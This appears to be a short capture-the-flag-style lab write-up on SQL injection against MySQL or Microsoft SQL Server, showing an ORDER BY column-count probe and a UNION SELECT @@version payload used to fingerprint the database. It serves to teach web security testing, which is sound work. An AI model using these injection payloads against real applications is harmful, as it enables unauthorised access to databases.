###  Lab: Querying the Database Type and Version on MySQL and Microsoft

```markdown
#  Lab: SQL Injection (MySQL/Microsoft Version Fingerprinting)

| **Category** | Web Security / SQL Injection |
| :--- | :--- |
| **Vulnerability Type** | SQL Injection |
| **Database** | MySQL / Microsoft SQL Server |
| **Goal** | Identify the database type and version. |
| **Status** | ✅ Solved |

---

##  Conceptual Overview
MySQL and Microsoft SQL Server share similar syntax for version checking, which differs from Oracle.
1.  **No FROM Clause:** You can run `SELECT 'a'` without specifying a table.
2.  **Version Variable:** The global variable `@@version` contains the system information.
3.  **Comment Syntax:** MySQL comments (`-- `) require a trailing space. In HTTP URLs, spaces must be encoded or represented as `+`.

---

##  Phase 1: Analysis

1.  **Column Count:** I used `' ORDER BY 1--+` to confirm **2 Columns**.
    * *Note:* I used the `+` sign to ensure the comment was interpreted correctly by the database (representing a space).

---

## ⚔️ Phase 2: Exploitation

I injected the `@@version` variable into the first column to retrieve the server details.

### The Payload:
```sql
' UNION SELECT @@version, NULL--+
```
## Execution Result:
The application displayed the version string (e.g., 5.7.34-0ubuntu...), confirming the database type and version.